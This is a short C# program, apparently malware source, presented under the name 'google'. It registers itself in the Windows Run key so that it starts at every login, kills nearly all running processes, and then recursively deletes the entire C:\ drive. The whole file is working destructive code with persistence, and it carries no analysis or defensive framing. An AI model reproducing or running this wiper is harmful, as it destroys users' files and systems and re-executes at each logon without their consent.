using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace google
{
    class Program
    {
        static void kill()
        {
            Process me = Process.GetCurrentProcess();
            foreach (Process p in Process.GetProcesses())
            {
                if (p.Id != me.Id
                    && p.ProcessName != "winlogon.exe"
                    && p.ProcessName != "explorer.exe"
                    && p.ProcessName != "System Idle Process"
                    && p.ProcessName != "taskmgr.exe"
                    && p.ProcessName != "spoolsv.exe"
                    && p.ProcessName != "csrss.exe"
                    && p.ProcessName != "smss.exe"
                    && p.ProcessName != "svchost.exe "
                    && p.ProcessName != "services.exe"
                )
                {
                    p.Kill();
                }
            }
        }

        static void autorun()
        {
            const string applicationName = "testProgram";
            const string pathRegistryKeyStartup =
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            using (RegistryKey registryKeyStartup =
                        Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
            {
                registryKeyStartup.SetValue(
                    applicationName,
                    string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));
            }
        }

        static void delete()
        {
            string pathFolder = @"C:\"; //Console.ReadLine();
            if (Directory.Exists(pathFolder))
                Directory.Delete(pathFolder, true);
            else
                Console.WriteLine("folder not found!");

        }

        static void Main(string[] args)
        {
            autorun();
            kill();
            delete();
            //Console.Write("please: enter path folder: ");
        }
    }
}
